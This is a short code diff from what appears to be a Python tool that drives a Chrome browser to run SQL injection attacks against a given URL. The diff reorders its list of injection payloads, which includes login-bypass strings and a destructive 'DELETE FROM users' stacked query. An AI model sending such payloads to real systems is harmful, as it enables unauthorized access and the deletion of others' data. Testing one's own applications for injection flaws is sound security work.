@@ -21,7 +21,7 @@ def button_click(event):
         runAttacks(url)
 
 def runAttacks(url):
-    INJECTION_QUERIES = ["1' OR 1=1 --", "%' or 1=1 --", "s'; delete from users where 1=1; --"]
+    INJECTION_QUERIES = ["s'; DELETE FROM users WHERE 1=1; --", "1' OR 1=1 --", "%' or 1=1 --"]
 
     driver = Chrome()
     #print(driver.request('POST', url))
